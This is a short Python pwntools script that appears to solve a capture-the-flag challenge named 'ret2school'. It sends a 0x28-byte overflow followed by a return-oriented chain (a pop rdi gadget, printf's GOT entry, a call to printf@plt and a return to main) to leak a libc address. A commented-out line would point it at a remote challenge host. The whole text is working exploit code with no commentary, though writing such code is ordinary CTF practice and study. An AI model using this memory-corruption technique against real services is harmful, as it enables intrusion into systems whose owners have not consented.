from pwn import *

# p = remote('20.169.252.240', 4922)
p = process('../cryptoversectf/ret2school/ret2school')
elf = ELF('../cryptoversectf/ret2school/ret2school')
# lib = ELF('./libc.so.6')
pop_rdi = 0x0000000000400743
payload = b'a' * 0x28 + p64(pop_rdi) + p64(elf.got['printf']) + p64(elf.plt['printf']) + p64(0x400698)
p.sendline(payload)
p.interactive()
